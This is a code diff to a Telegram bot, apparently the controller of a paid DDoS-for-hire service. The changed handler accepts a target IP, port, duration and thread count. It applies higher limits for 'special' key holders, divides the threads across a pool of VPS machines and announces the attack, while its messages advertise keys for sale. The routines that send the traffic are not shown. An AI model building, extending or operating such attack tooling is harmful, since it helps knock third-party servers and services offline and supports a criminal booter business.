@@ -1535,20 +1535,60 @@ async def attack_input(update: Update, context: CallbackContext):
     global last_attack_time, running_attacks
 
     args = update.message.text.split()
-    if len(args) != 3:  # Now only 3 arguments (ip, port, duration)
+    if len(args) != 4:  # ip, port, duration, threads
         current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
         await update.message.reply_text(
-            f"❌ *Invalid input! Please enter <ip> <port> <duration>*\n\n"
+            f"❌ *Invalid input! Please enter <ip> <port> <duration> <threads>*\n\n"
             f"👑 *Bot Owner:* {current_display_name}\n"
             f"💬 *Need a key for 200s? DM:* {current_display_name}",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
-    ip, port, duration = args
-    duration = int(duration)
+    ip, port, duration_str, threads_str = args
     
-    # [Previous validation code remains the same...]
+    try:
+        duration = int(duration_str)
+        threads = int(threads_str)
+    except ValueError:
+        await update.message.reply_text("❌ Invalid duration or threads! Please enter numbers.", parse_mode='Markdown')
+        return ConversationHandler.END
+
+    # Check if user has special key privileges
+    user_id = update.effective_user.id
+    is_special = False
+    
+    if user_id in redeemed_users:
+        if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special', False):
+            is_special = True
+
+    # Validate attack parameters
+    max_allowed_duration = SPECIAL_MAX_DURATION if is_special else max_duration
+    max_allowed_threads = SPECIAL_MAX_THREADS if is_special else MAX_THREADS
+    
+    if duration > max_allowed_duration:
+        await update.message.reply_text(
+            f"❌ Duration too long! Max allowed: {max_allowed_duration} seconds",
+            parse_mode='Markdown'
+        )
+        return ConversationHandler.END
+        
+    if threads > max_allowed_threads:
+        await update.message.reply_text(
+            f"❌ Too many threads! Max allowed: {max_allowed_threads}",
+            parse_mode='Markdown'
+        )
+        return ConversationHandler.END
+
+    # Check available VPS
+    if not VPS_LIST:
+        await update.message.reply_text("❌ No VPS available for attack!", parse_mode='Markdown')
+        return ConversationHandler.END
+
+    # Calculate threads per VPS
+    total_vps = min(ACTIVE_VPS_COUNT, len(VPS_LIST))
+    threads_per_vps = threads // total_vps
+    remaining_threads = threads % total_vps
 
     attack_id = f"{ip}:{port}-{time.time()}"
     attack_type = "⚡ *SPECIAL ATTACK* ⚡" if is_special else "⚔️ *Attack Started!*"
@@ -1559,8 +1599,9 @@ async def attack_input(update: Update, context: CallbackContext):
         f"🎯 *Target*: {ip}:{port}\n"
         f"🕒 *Duration*: {duration} sec\n"
         f"🧵 *Total Power*: {threads} threads\n"
+        f"💻 *VPS Count*: {total_vps}\n"
         f"👑 *Bot Owner:* {current_display_name}\n\n"
-        f"🔥 *ATTACK STARTED! /running * 💥",
+        f"🔥 *ATTACK STARTED!* 💥",
         parse_mode='Markdown'
     )
 
